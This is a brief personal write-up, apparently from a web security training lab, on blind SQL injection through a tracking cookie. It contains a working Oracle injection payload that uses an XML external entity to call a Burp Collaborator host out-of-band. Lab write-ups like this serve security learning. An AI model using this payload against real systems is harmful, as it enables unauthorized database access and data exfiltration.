# Lab: Blind SQL injection with out-of-band interaction

Vulnerable parameter : Tracking cookie

Analysis :
ayhaga.burpcollaborator.net

1- try oracle

`' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://ayhaga.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual) --` -> worked :"D
